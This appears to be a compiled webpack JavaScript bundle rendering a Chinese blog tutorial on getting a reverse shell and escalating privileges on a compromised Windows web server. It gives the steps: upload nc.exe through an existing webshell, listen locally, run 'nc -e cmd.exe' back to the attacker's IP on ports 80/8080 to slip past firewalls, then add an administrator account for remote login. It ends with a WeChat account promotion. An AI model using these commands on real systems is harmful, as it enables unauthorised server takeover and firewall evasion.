(window.webpackJsonp=window.webpackJsonp||[]).push([[187],{472:function(a,s,t){"use strict";t.r(s);var n=t(6),e=Object(n.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"nc反弹cmdshell提权总结"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#nc反弹cmdshell提权总结"}},[a._v("#")]),a._v(" NC反弹CMDSHELL提权总结")]),a._v(" "),s("p",[a._v("Server-U等都不可以用的情况下.  一般都可思考用此方法\n不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口…  那么这种方法也失效了….")]),a._v(" "),s("p",[a._v("1:通过shell将上传NC和CMD传到站点目录下(这里一定上传的注意权限,最好是可读写目录下)\nweb目录都是有写有读的权限,我们直接传NC进去")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20181231145050556.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("2:然后本地执行nc -vv -lp 52进行反弹")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20181231145122207.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("3:在shell命令下执行")]),a._v(" "),s("p",[a._v("F:\\wwwroot\\img\\nc.exe -e cmd上传路径 IP(外网IP) 52(这里是本机端口)")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20181231145154571.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("4:在shell里执行命令后,马上看到本地CMS里已经反弹上去了,执行net user 也是成功.")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20181231145225477.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("5:直接添加用户,然后远程去连接!")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20181231145257596.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("看到添加成功,也设置为管理组了!接下来直接远程连接就OK!")]),a._v(" "),s("p",[a._v("不少人NC提权没有成功过，因为其中的原因是你没有降低权限，而导致了NC提权失败")]),a._v(" "),s("p",[s("strong",[a._v("失败总结：")])]),a._v(" "),s("p",[a._v("1.反弹端口")]),a._v(" "),s("p",[a._v("网上不少文章写 反弹端口445 110 什么的，你当防火墙白痴是不是，我建议看一下端口有没有8080端口，如果没有8080端口的话，要反弹8080端口，这样被防火墙阻止的概率较小")]),a._v(" "),s("p",[a._v("2.降低运行权限")]),a._v(" "),s("p",[a._v("1.现在本地监听一个端口")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("nc")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-vv")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-l")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("8080")]),a._v(" //最好是80或8080这样的端口，被防火墙拦截的几率很小。\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("2.在WebShell运行下面命令连接我们监听的端口得到CmdShell:")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("nc")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-vv")]),a._v(" IP "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("8080")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-e")]),a._v(" C:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("Documents and Settings"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("All  Users"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("Documents"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v('cmd.exe //假设cmd.exe是上传在"C:'),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("Documents and Settings"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("All  Users"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("Documents"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v('"这个目录\n')])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"写在最后"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[a._v("#")]),a._v(" 写在最后")]),a._v(" "),s("blockquote",[s("p",[a._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);s.default=e.exports}}]);